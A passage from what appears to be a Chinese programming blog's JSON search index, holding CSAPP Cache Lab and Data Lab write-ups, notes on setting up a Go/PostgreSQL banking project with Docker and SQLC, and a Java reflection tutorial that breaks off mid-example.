{"pages":[{"title":"","text":"cuzz’s blog由Hexo强力驱动，托管在github，采用next主题","link":"/README.html"},{"title":"404","text":"","link":"/404/index.html"},{"title":"关于","text":"自我介绍联系我： 微信：cuzz_2020 邮箱：cuzz1234@163.com","link":"/about/index.html"},{"title":"","text":"","link":"/categories/index.html"},{"title":"","text":"","link":"/tags/index.html"}],"posts":[{"title":"Cache Lab","text":"介绍本实验有两个部分，Part A 要求我们模拟一个 cache 行为，正确地模拟每次操作（如 load、store、modify） cache 的响应（hit、miss、eviction）。Part B 要求我们用尽可能少的 cache 的 miss 实现矩阵的转置，充分利用 cache。 实验说明：地址 Part A在本实验中，需要完成 csim.c 文件，使之编译后实现类似功能： Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;• -h: Optional help flag that prints usage info• -v: Optional verbose flag that displays trace info• -s &lt;s&gt;: Number of set index bits (S = 2sis the number of sets)• -E &lt;E&gt;: Associativity (number of lines per set)• -b &lt;b&gt;: Number of block bits (B = 2bis the block size)• -t &lt;tracefile&gt;: Name of the valgrind trace to replay 要求我们的程序可以手动设置 cache 的 set 数、line 数、block 大小，读取指定的文件内容进行操作，指令类似如下： I 0400d7d4,8M 0421c7f0,4L 04f6b868,8S 7ff0005c8,8 每行代表一个操作，格式: [space]operation address,size I 代表 instruction load, L 代表 data load, S 代表 data store, M 代表 data modify (i.e., a data load followed by a data store) 回顾一下 cahce 具体结构： 具体如下： #include &quot;cachelab.h&quot;#include &lt;getopt.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;typedef unsigned long int uint64_t;typedef struct { int valid; int lru; uint64_t tag;}cacheLine;typedef cacheLine* cacheSet;typedef cacheSet* Cache;const char* usage = &quot;Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\\n&quot;;int verbose = 0; //verbose flag int s; //number of set index bits int E; //number of lines per setint b; //number of block bitsFILE* fp = NULL;Cache cache;int hits = 0;int misses = 0;int evictions = 0;void parseArgument(int argc, char* argv[]);int visitCache(uint64_t address);int simulate();int main(int argc, char* argv[]){ parseArgument(argc, argv); simulate(); printSummary(hits, misses, evictions); return 0;}void parseArgument(int argc, char* argv[]){ int opt; while ((opt = getopt(argc, argv, &quot;hvs:E:b:t:&quot;)) != -1) { switch(opt) { case 'h': fprintf(stdout, usage, argv[0]); exit(1); case 'v': verbose = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': fp = fopen(optarg, &quot;r&quot;); break; default: fprintf(stdout, usage, argv[0]); exit(1); } }}int simulate(){ int S = pow(2, s); cache = (Cache)malloc(sizeof(cacheSet) * S); if (cache == NULL) return -1; for (int i = 0; i &lt; S; i++) { cache[i] = (cacheSet)calloc(E, sizeof(cacheLine)); if (cache[i] == NULL) return -1; } char buf[20]; char operation; uint64_t address; int size; while (fgets(buf, sizeof(buf), fp) != NULL) { int ret; if (buf[0] == 'I') //ignore instruction cache accesses { continue; } else { sscanf(buf, &quot; %c %lx,%d&quot;, &amp;operation, &amp;address, &amp;size); switch (operation) { case 'S': ret = visitCache(address); break; case 'L': ret = visitCache(address); break; case 'M': ret = visitCache(address); hits++; break; } if (verbose) { switch(ret) { case 0: printf(&quot;%c %lx,%d hit\\n&quot;, operation, address, size); break; case 1: printf(&quot;%c %lx,%d miss\\n&quot;, operation, address, size); break; case 2: printf(&quot;%c %lx,%d miss eviction\\n&quot;, operation, address, size); break; } } } } for (int i = 0; i &lt; S; i++) free(cache[i]); free(cache); fclose(fp); return 0;}/*return value 0 cache hit 1 cache miss 2 cache miss, eviction*/int visitCache(uint64_t address){ uint64_t tag = address &gt;&gt; (s + b); unsigned int setIndex = address &gt;&gt; b &amp; ((1 &lt;&lt; s) - 1); int evict = 0; int empty = -1; cacheSet cacheset = cache[setIndex]; for (int i = 0; i &lt; E; i++) { if (cacheset[i].valid) { if (cacheset[i].tag == tag) { hits++; cacheset[i].lru = 1; return 0; } cacheset[i].lru++; if (cacheset[evict].lru &lt;= cacheset[i].lru) // =是必须的,why? { evict = i; } } else { empty = i; } } //cache miss misses++; if (empty != -1) { cacheset[empty].valid = 1; cacheset[empty].tag = tag; cacheset[empty].lru = 1; return 1; } else { cacheset[evict].tag = tag; cacheset[evict].lru = 1; evictions++; return 2; }} Part B参考总结","link":"/2000/12/13/CSAPP_Cache_Lab/"},{"title":"Data Lab","text":"前言CSAPP 这本书买了好几年，最近抽出一些时间开始重头读这本书，发现这些基础知识比较重要，边看书边跟着视频课程过了一遍，有些东西还是比较模糊。本文开始做 CSAPP Lab 实验，加强巩固书的内容。 说明这个实验主要考察整数和单精度浮点数的表示以及位运算，加强深对对计算机数据表示的理解。 任务指引还是比较清晰的，主要有以下一些说明： 整型的范围是 0 到 255(0xFF)，不允许用更大 只能包含参数和局部变量 一元操作符 ! ~ 二元操作符 &amp; | + &lt;&lt; &gt;&gt; 浮点数可以使用控制语句 题目bitXor/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));} 异或就是二级制不相等才为1，同时为 0 或者同时为 1，结果为 0 ，比如： 十进制 二进制 4 100 5 101 001 // 异或结果 其中(~x &amp; y) 表示 x 中的 0 和 y 中的 1，(x &amp; ~y)表示 x 中的 1和 y 中的 0，然后通过德·摩根定律~(a &amp; b) = ~a | ~b。 x ^ y = (~x &amp; y) | (x &amp; ~y) = ~(~(~x &amp; y) &amp; ~(x &amp; ~y)) tmin/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { return 1 &lt;&lt; 31;} 这个题目比较简单，int 有符号采用的是补码表示如图，最小为10000000 00000000 00000000 00000000 我们只需要把 1 往左移动 31 位就行。 isTmax/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { return !(x + 1 + x + 1) &amp; !!(~x);} 我们发现最大值两倍加二为0，但是要排除 -1（补码全为1）后面!!(~x) 就是这个逻辑。 x 01111111 11111111 11111111 11111111x + 1 10000000 00000000 00000000 00000000x + 1 + x 11111111 11111111 11111111 11111111x + 1 + x + 1 00000000 00000000 00000000 00000000 allOddBits/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int e = 0xAA | (0xAA &lt;&lt; 8); e = e | (e &lt;&lt; 16); return !((e &amp; x) ^ e);} 先获取全为奇数位的数，这里的奇数指的是位的阶级是 2 的几次幂。然后取并如果偶数为有值，那么异或之后就不会为0。 // 10101010 10101010 10101010 10101010int a = 0xAA; // 00000000 00000000 00000000 10101010int b = 0xAA &lt;&lt; 8; // 00000000 00000000 10101010 00000000int c = a | b; // 00000000 00000000 10101010 10101010int d = c &lt;&lt; 16; // 10101010 10101010 00000000 00000000int e = c | d; // 10101010 10101010 10101010 10101010 negate/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { return ~x + 1;} 可以发现取反之后两个之和为 -1，x + ~x = -1，那么-x = ~x + 1然后只需要取反加 1就行， -8 -7 -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6 71000 1001 1010 1011 1100 1101 1110 1111 0000 0001 0010 0011 0100 0101 0110 0111 0111 1001 0101 0100 0011 0010 0001 0000 1111 1110 1101 1100 1011 1010 1001 1000 7 6 5 4 3 2 1 0 -1 -2 -3 -4 -5 -6 -7 -8 isAsciiDigit/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int min = 0x1 &lt;&lt; 31; int max = ~min; int start = ~0x39; int end = max - 0x30 + 1; int c = (x + start) &gt;&gt; 31; int d = (x + end) &gt;&gt; 31; // printf(&quot;x=%d, c=%d, d=%d\\n&quot;,x, c, d); return !!(c &amp; d);} 比如保证 a + start &lt; 0 并且 b + start &lt; 0，然后 a + end &lt; 0 并且 b + end &lt; 0，这个时候是溢出小于零。根据如果 x 为负数x &gt;&gt; 31 = -1，否者 x &gt;&gt; 31 = 0，再通过两次去反获得。 -8 -7 -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6 71000 1001 1010 1011 1100 1101 1110 1111 0000 0001 0010 0011 0100 0101 0110 0111 a &lt;= x &lt;= b 1 &lt;= x &lt;= 3 2&lt;= x &lt;= 5 start end -4 7 -6 6 -y = ~y + 1start + b = -1 =&gt; start = -1 - b = ~ba + end = max + 1 =&gt; end = max + 1 - a = max - a + 1 conditional/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { int mask = ~!x + 1; return (y &amp; ~mask) | (z &amp; mask);} 这是一个if-else 语句，我们可以转化为 (y op expr) | (z op expr)，其中 op 为操作符，expr 为表达式。 (y op expr) | (z op expr)x == 0 mask = 0xFFFFFFFx != 0 mask = 0xOOOOOOO isLessOrEqual/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int x_sign = (x &gt;&gt; 31) &amp; 0x01; // x 的符号 int y_sign = (y &gt;&gt; 31) &amp; 0x01; // y 的符号 int a = !(x ^ y); int b = (x_sign &amp; (!y_sign)); // 判断是否 x &lt; 0 y &gt; 0 int c = (!((x_sign ^ y_sign) &amp; 0x01)); // 判断符号是否相等 // x - y = x + ~y + 1 int res_sign = ((x + ~y + 1) &gt;&gt; 31) &amp; 0x01;// 判断x-y的符号 return a | b | (c &amp; res_sign);} 用 x - y 通过符号来判断，但是可能会溢出，所以当符号不相同就可以直接判断大小。 x y x - y x &gt; 0 y &gt; 0 正常 x &gt; 0 y &lt; 0 可能向上溢出 x &lt; 0 y &gt; 0 可能向下溢出 x &lt; 0 y &lt; 0 正常 主要分为3部， 看看是否两个数相等 !(x ^ y) 如果相等为1 判断符号是否相反，主要看 x &lt; 0，y &gt; 0 判断符号相等的时候，x - y &lt; 0 logicalNeg/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) { int neg_x = ~x + 1; return ((neg_x | x) &gt;&gt; 31) + 1;} 求 x | -x ，如果 x 不为 0 的化，那么符号位一定为 1，如果 x 为 0 那么符号为0。 howManyBits/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 // 0_1100 * howManyBits(298) = 10 // 0_100101010 * howManyBits(-5) = 4 // 1_101 * howManyBits(0) = 1 // 0 * howManyBits(-1) = 1 // 1 * howManyBits(1) = 2 // 0_1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b16, b8, b4, b2, b1, b0; int mask = x &gt;&gt; 31; // 如果x为正数，保持不变；如果为负数，按位取反 x = (mask &amp; ~x) | (~mask &amp; x); // 如果高16位有1，b16 = 16，否者为0 b16 = !!(x &gt;&gt; 16) &lt;&lt; 4; // 如果高16位有1，x右移16位，在新的16为重继续找 x = x &gt;&gt; b16; // 高8 b8 = !!(x &gt;&gt; 8) &lt;&lt; 3; x = x &gt;&gt; b8; // 高4位 b4 = !!(x &gt;&gt; 4) &lt;&lt; 2; x = x &gt;&gt; b4; // 高2位 b2 = !!(x &gt;&gt; 2) &lt;&lt; 1; x = x &gt;&gt; b2; // 高1位 b1 = !!(x &gt;&gt; 1); x = x &gt;&gt; b1; // 底1位 b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1;} 对于正数，找到最左边的 1，对于负数，按位取反处理。 0 1 1 1 0 0 0 1 b4 = 40 1 1 1 b2 = 20 1 b1 = 0 1 b0 = 1 floatScale2/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { // sign exp frac // 1 8 23 unsigned sign = (uf &gt;&gt; 31) &amp; 0x01; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF; unsigned frac = uf &amp; 0x7FFFFF; // 特殊 if (exp == 0xFF) { return uf; } // 非规格化 else if (exp == 0) { frac = frac &lt;&lt; 1; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac; } // 规格化 else { exp ++; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac; }} 先分别求出 sign ，exp 和 frac，如果是特殊值直接返回，在判断是否是规格化，分别处理。 floatFloat2Int/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { // sign exp frac // 1 8 23 unsigned sign = (uf &gt;&gt; 31) &amp; 0x01; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF; unsigned frac_v = uf &amp; 0x7FFFFF; // E = exp - Bias = exp - 127 int E = exp - 127; // 超过范围 if (E &gt;= 31) { return 0x80000000u; } // 小数 if (E &lt; 0) { return 0; } // M = frac + 1; unsigned unsigned_res = (frac_v &gt;&gt; (23 - E)) | (1 &lt;&lt; E); if (sign) { return -unsigned_res; } return unsigned_res;} 把浮点数转化为有符号整数，M = 1 + frac，frac 一共 23 位，左移 23 - E 就获得我们想要的书，但是要加上隐藏的 1，最后根据符号位取相反数就行。 floatPower2/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { // 非规格化最小值 // 0 00000000 00000000000000000000001 // E = 1 - Bias = 1 - 127 = 126 // frac = 1 * 2^-22 // M = frac // V = 2^E * M = 2^-148 if (x &lt; -148) { return 0; } // 非规格化最大值 // 0 000000 111111111111111111111111 // E = 1 - Bias = 1 - 127 = -126 // frac = 1 (近似,小于) // M = frac // V = 2^E * M = 2^-126 (近似，小于) if (x &lt; -126) { return 1 &lt;&lt; (x + 148); } // 规格化最大值 // 0 11111110 11111111111111111111111 // E = exp - Bias = 254 - 127 = 127 // M = 1 + frac = 1.111111111111111111111111 // V = 2^E * M = 2^128 (近似,小于) if (x &gt;= 128) { return 0xFF &lt;&lt; 23; } // 规格化最小值 // 0 00000001 00000000000000000000000 // E = exp - Bias = 1 - 127 = -126 // M = 1 + frac = 1 // V = 2^E * M = 2^-126 if (x &gt;= -126) { int exp = x + 127; return exp &lt;&lt; 23; } return 0;} 求 2.0^x 的浮点数表示，只要抓住几个边界条件就行。 测试一下最后我们运行一下测试程序，发现都通过了，开心。 总结主要考察整数和单精度浮点数的表示以及位运算，加强深对对计算机数据表示的理解。 参考 CSAPP:Lab1-Data Lab 【读厚 CSAPP】I Data Lab","link":"/2020/10/11/CSAPP_Data_Lab/"},{"title":"Go项目笔记","text":"前言最近在公司有开始接触 Go 的项目，想系统的学习一下。相对来说 Go 的语法还是比较简单，很容易上手。快速看完两本入门书，想找一些偏项目的书来看，发现目前国内还是比较少。然后翻了一下培训机构的教程，感觉也不是很好，偶然在油管上看到这个教程 Backend master class，感觉讲的不错，就把这个教程整理出来。 介绍这是一个从设计、开发到部署的完整的 Go 项目，使用 PostgreSQL、Golang 和 Docker，这个项目主要来构建一个简单的银行系统，主要提供一下功能： 创建和管理帐户：所有者、余额、货币 记录所有余额变化：为每次更改创建一个帐户条目 转账交易：在一笔交易中，在两个账户之间进行一致的转账 数据库设计设计数据库架构使用 dbdiagram.io 设计表结构，采用的 DSL 语言来定义： Table accounts as A { id bigint [pk, increment, note: '主键'] owner varchar [not null, note: '账户所有者'] balance bigint [not null, note: '账户余额'] currency varchar [not null, note: '货币类型，比如：人民币'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { owner } note: '账户'}Table entries { id bigint [pk, increment, note: '主键'] account_id bigint [not null, ref: &gt; A.id, note:'账户id，关联account的id'] amount bigint [not null, note:'变化金额，可正可负'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { account_id } note: '记录所有余额变化'}Table transfers { id bigint [pk, increment, note: '主键'] from_account_id bigint [not null, ref: &gt; A.id, note: '转账id'] to_account_id bigint [not null, ref: &gt; A.id, note: '被转账id'] amount bigint [not null, note: '必须为正'] created_at timestamptz [not null, default:`now()`, note: '创建时间'] Indexes { from_account_id to_account_id (from_account_id, to_account_id) } note: '转账交易记录'} 可以生成响应的关系图： 可以导出 PostgreSQL，MySQL等等 还可以创建分享链接，这个表的链接为： https://dbdiagram.io/d/5fcc5ee49a6c525a03b9f27d 使用 Docker 安装 Postgers先安装 docker，可参考网上 先登入 docker 官方，查找可用的镜像，找到一个为 12-alpine，使用 docker pull &lt;image&gt;:&lt;tag&gt; 方式拉去这个镜像 docker pull postgres:12-alpine 输入 docker images 就可看到我们拉去的镜像了 ~ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpostgres 12-alpine b5a8143fc58d 3 weeks ago 158MB 通过以下格式来运行，我们知道一个镜像（image）可用运行多个容器（container） docker run --name&lt;container_name&gt; // 容器名称 -e &lt;environment_variable&gt; // 环境变量 -p &lt;host_port:containter_ports&gt; // 端口映射 -d &lt;image&gt;:&lt;tag&gt; // 后台运行 运行镜像： docker run --name postgres12 \\ -e POSTGRES_USER=root -e POSTGRES_PASSWORD=12356 \\ -p 5432:5432 \\ -d postgres:12-alpine \\ 使用 docker ps 查看运行的镜像 ~ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES5c337d6516a6 postgres:12-alpine &quot;docker-entrypoint.s…&quot; About a minute ago Up About a minute 0.0.0.0:5432-&gt;5432/tcp postgres12 在运行的容器中执行命令： docker exec -it &lt;container_name_or_id&gt; &lt;commend&gt; [args] 进入 postgres 命令终端 docker exec -it postgres12 psql -U rootpsql (12.5)Type &quot;help&quot; for help.root=# 使用 DataGrip 连接数据库，并且把生成的 SQL 导入 DataGrip 中，生成相应的表。 SQL/GORM/SQLX/SQLC生成CRUD的比较SQL 快、直接 手动映射 容易写错 GORM CRUD 已经实现了 需要学习一些 gorm 语法 比较慢 SQLX 快，容易使用 通过查询语句和结构体tag映射 SQLC 快，容易使用 自动代码生成 最终我们选择 SQLC，https://github.com/kyleconroy/sqlc 在 mac 上安装 brew install kyleconroy/sqlc/sqlc","link":"/2020/12/06/Go%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"},{"title":"Java 反射","text":"java 反射 Reflection is a feature in the Java programming language. It allows an executing Java program to examine or “introspect” upon itself, and manipulate internal properties of the program. For example, it’s possible for a Java class to obtain the names of all its members and display them. The ability to examine and manipulate a Java class from within itself may not sound like very much, but in other programming languages this feature simply doesn’t exist. For example, there is no way in a Pascal, C, or C++ program to obtain information about the functions defined within that program. One tangible use of reflection is in JavaBeans, where software components can be manipulated visually via a builder tool. The tool uses reflection to obtain the properties of Java components (classes) as they are dynamically loaded. 类加载器当程序有使用某个类时，如果该类还没有被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化 加载 就是指将class文件读入内存，并为之创建一个Class对象，任何类被使用时系统都会建立一个Class对象 连接 验证：是否有正确的内部结构，并和其他类协调一致 准备：负责为类的静态成员分配内存，并设置默认初始化值 解析：将类的二进制数据中的符号引用替换为直接引用 初始化 对类的静态变量，静态代码块执行初始化操作 类初始化时机 创建类的实例 类的静态变量，或者为静态变量赋值 类的静态方法 使用反射方式来强制创建某个类或接口对应的java.lang.Class对象 初始化某个类的子类 直接使用java.exe命令来运行某个主类 类加载器作用 负责将.class文件加载到内在中，并为之生成对应的Class对象 虽然我们不需要关心类加载机制，但是了解这个机制我们就能更好的理解程序的运行 类加载器的组成 Bootstrap ClassLoader 根类加载器也被称为引导类加载器，负责Java核心类的加载比如System，String等。在 JDK 中 JRE 的 lib 目录下 rt.jar 文件中 Extension ClassLoader 扩展类加载器负责 JRE 的扩展目录中 jar 包的加载。在 JDK 中 JRE 的 lib 目录下 ext 目录 System ClassLoader 系统类加载器负责在JVM启动时加载来自java命令的class文件，以及classpath环境变量所指定的jar包和类路径 通过这些描述就可以知道我们常用的类，都是由谁来加载完成的。 到目前为止我们已经知道把class文件加载到内存了，那么，如果我们仅仅站在这些class文件的角度，我们如何来使用这些class文件中的内容呢? 这就是我们反射要研究的内容 反射JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。 要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象。 Class类阅读API的Class类得知，Class 没有公共构造方法。Class 对象是在加载类时由 Java 虚拟机以及通过调用类加载器中的 defineClass 方法自动构造的。 获取Class对象的三种方式方式一: 通过Object类中的getObject()方法 Person p = new Person();Class c = p.getClass(); 方式二: 通过 类名.class 获取到字节码文件对象（任意数据类型都具备一个class静态属性,看上去要比第一种方式简单） Class c2 = Person.class; 方式三: 通过Class类中的方法（将类名作为字符串传递给Class类中的静态方法forName即可） Class c3 = Class.forName(&quot;cn.cuzz.Person&quot;); 注意：第三种和前两种的区别 前两种你必须明确Person类型。 后面是指定这种类型的字符串就行(要包含包名)，这种扩展更强，我不需要知道你的类，我只提供字符串，按照配置文件加载就可以了。 Person类public class Person { // 成员变量 public String name; public int age; private String address; // 构造方法 public Person() { System.out.println(&quot;空参数构造方法&quot;); } public Person(String name) { this.name = name; System.out.println(&quot;带有String的构造方法&quot;); } // 私有的构造方法 private Person(String name, int age){ this.name = name; this.age = age; System.out.println(&quot;带有String，int的构造方法&quot;); } public Person(String name, int age, String address){ this.name = name; this.age = age; this.address = address; System.out.println(&quot;带有String, int, String的构造方法&quot;); } // 成员方法 // 没有返回值没有参数的方法 public void method1(){ System.out.println(&quot;没有返回值没有参数的方法&quot;); } // 没有返回值，有参数的方法 public void method2(String name){ System.out.println(&quot;没有返回值，有参数的方法 name= &quot;+ name); } // 有返回值，没有参数 public int method3(){ System.out.println(&quot;有返回值，没有参数的方法&quot;); return 123; } // 有返回值，有参数的方法 public String method4(String name){ System.out.println(&quot;有返回值，有参数的方法&quot;); return &quot;哈哈&quot; + name; } // 私有方法 private void method5(){ System.out.println(&quot;私有方法&quot;); } @Override public String toString() { return &quot;Person [name=&quot; + name + &quot;, age=&quot; + age + &quot;, address=&quot; + address+ &quot;]&quot;; }} 通过反射获取构造方法并使用在反射机制中，把类中的成员（构造方法、成员方法、成员变量）都封装成了对应的类进行表示。其中，构造方法使用类Constructor表示。可通过Class类中提供的方法获取构造方法： 返回一个构造方法 public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) 获取public修饰, 指定参数类型所对应的构造方法 public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes) 获取指定参数类型所对应的构造方法(包含私有的) 返回多个构造方法 public Constructor&lt;?&gt;[] getConstructors() 获取所有的public 修饰的构造方法 public Constructor&lt;?&gt;[] getDeclaredConstructors() 获取所有的构造方法(包含私有的) package cn.cuzz;import java.lang.reflect.Constructor;public class Test { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, SecurityException { // 获取Class对象 包名.类 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取所有构造方法 // 只包括public Constructor[] cons = c.getConstructors(); // 即包括public也包括private Constructor[] conss = c.getDeclaredConstructors(); // 获取一个构造方法 // public Person() Constructor con1 = c.getConstructor(null); System.out.println(con1); // public Person(String name) Constructor con2 = c.getConstructor(String.class); System.out.println(con2); // private Person(String name, int age) Constructor con3 = c.getDeclaredConstructor(String.class, int.class); System.out.println(con3); // public Person(String name, int age, String address) Constructor con4 = c.getDeclaredConstructor(String.class, int.class, String.class); System.out.println(con4); }} 通过反射方式，获取构造方法，创建对象获取构造方法，步骤如下： 获取到Class对象 获取指定的构造方法 通过构造方法类Constructor中的方法，创建对象public T newInstance(Object... initargs) package cn.cuzz;import java.lang.reflect.Constructor;public class Test2 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取指定构造器 Constructor con = c.getConstructor(String.class, int.class, String.class); // 通过构造方法中的Constructor的方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;, 18, &quot;武汉&quot;); System.out.println(obj); // Person [name=cuzz, age=18, address=武汉] }} 通过反射获取成员变量并使用在反射机制中，把类中的成员变量使用类Field表示。可通过Class类中提供的方法获取成员变量： 返回一个成员变量 public Field getField(String name) 获取指定的public修饰的变量 public Field getDeclaredField(String name) 获取指定的任意变量 返回多个成员变量 public Field[] getFields() 获取所有public 修饰的变量 public Field[] getDeclaredFields() 获取所有的 变量 (包含私有) package cn.cuzz;import java.lang.reflect.Field;public class Test3 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取多个成员变量 Field[] fields = c.getFields(); Field[] fieldss = c.getDeclaredFields(); // 一个变量 // public int age Field ageField = c.getField(&quot;age&quot;); System.out.println(ageField); // public int cn.cuzz.Person.age // private String address Field addressField = c.getDeclaredField(&quot;address&quot;); System.out.println(addressField); // private java.lang.String cn.cuzz.Person.address }} 通过反射，创建对象，获取指定的成员变量，进行赋值与获取值操作获取成员变量，步骤如下： 获取Class对象 获取构造方法 通过构造方法，创建对象 获取指定的成员变量（私有成员变量，通过setAccessible(boolean flag)方法暴力访问） 通过方法，给指定对象的指定成员变量赋值或者获取值public void set(Object obj, Object value)在指定对象obj中，将此 Field 对象表示的成员变量设置为指定的新值public Object get(Object obj)返回指定对象obj中，此 Field 对象表示的成员变量的值 package cn.cuzz;import java.lang.reflect.Constructor;import java.lang.reflect.Field;public class Test4 { public static void main(String[] args) throws IllegalAccessException, Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取构造方法 Constructor con = c.getConstructor(String.class); // 通过构造方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;); // 获取指定成员变量 // public String name Field nameField = c.getField(&quot;name&quot;); // public int age Field ageField = c.getField(&quot;age&quot;); // 赋值 nameField.set(obj, &quot;Cuzz&quot;); ageField.set(obj, 23); System.out.println(&quot;name = &quot;+ nameField.get(obj)); // name = Cuzz System.out.println(&quot;age = &quot;+ ageField.get(obj)); // age = 23 }} 通过反射获取成员方法并使用在反射机制中，把类中的成员方法使用类Method表示。可通过Class类中提供的方法获取成员方法： 返回获取一个方法： public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) 获取 public 修饰的方法 public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) 获取任意的方法，包含私有的 参数1: name 要查找的方法名称； 参数2： parameterTypes 该方法的参数类型 返回获取多个方法： public Method[] getMethods() 获取本类与父类中所有public 修饰的方法 public Method[] getDeclaredMethods() 获取本类中所有的方法(包含私有的) package cn.cuzz;import java.lang.reflect.Method;public class Test5 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取多个方法 Method[] methods = c.getMethods(); Method[] methodss = c.getDeclaredMethods(); // 获取一个方法： // public void method1() Method method = c.getMethod(&quot;method1&quot;, null); System.out.println(method); // public String method4(String name){ method = c.getMethod(&quot;method4&quot;, String.class); System.out.println(method); // 私有方法 // private void method5() method = c.getDeclaredMethod(&quot;method5&quot;, null); System.out.println(method); }} 通过反射，创建对象，调用指定的方法获取成员方法，步骤如下： 获取Class对象 获取构造方法 通过构造方法，创建对象 获取指定的方法 执行找到的方法(如果获取的是私有方法则要开启暴力访问m5.setAccessible(true)) public Object invoke(Object obj, Object... args) 执行指定对象obj中，当前Method对象所代表的方法，方法要传入的参数通过args指定 package cn.cuzz;import java.lang.reflect.Constructor;import java.lang.reflect.Method;public class Test6 { public static void main(String[] args) throws Exception { // 获取Class对象 Class c = Class.forName(&quot;cn.cuzz.Person&quot;); // 获取指定构造器 Constructor con = c.getConstructor(String.class, int.class, String.class); // 